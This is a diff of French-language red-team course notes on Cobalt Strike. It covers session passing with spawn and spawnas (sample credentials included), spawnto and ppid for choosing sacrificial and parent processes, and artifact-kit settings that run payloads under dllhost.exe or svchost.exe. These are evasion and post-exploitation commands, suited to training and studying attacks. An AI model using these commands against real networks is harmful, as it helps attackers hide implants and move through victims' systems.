@@ -1,11 +1,33 @@
+
+# Session Passing
+
+## spawn
+
+```
+beacon> spawn x64 http
+```
+
+![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/04726cd3879e34328049a74ba6ae7288.png)
+
+## spawnas
+
+```
+cd C:\
+spawnas CONTOSO\rsteel Passw0rd! tcp-local
+```
+
+![](https://lwfiles.mycourse.app/66e95234fe489daea7060790-public/81ff27d13c2bcb86edcb83e11818cf41.png)
 # Spawnto
 
-- **spawnto** changes the sacrificial process for fork & run commands.
 - **ppid** sets the parent PID for fork & run commands.
+- **spawnto** changes the sacrificial process for fork & run commands.
 ```
 spawnto x64 C:\Windows\System32\dllhost.exe
+```
 
-
+Commandes affectée par `spawnto` :
+```
+spawn
 execute-assembly
 powerpick
 mimikatz
@@ -15,17 +37,20 @@ keylogger
 portscan
 ```
 
-ak-settings spawnto_x64 change le process sous lequel spawn les PE générés (exe, DLL, etc..)
+- ak-settings spawnto_x64 change le process sous lequel spawn les PE générés (exe, DLL, etc..)
 ```
 ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
 ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+```
 
-jump scshell64 lon-ws-1 smb
+Commandes affectée par `ak-settings spawnto_x64` :
+```
+jump
 inject
 elevate
 ```
 
-PATHs
+**PATHs**
 ```
 C:\Windows\System32\dllhost.exe
 C:\Windows\System32\svchost.exe
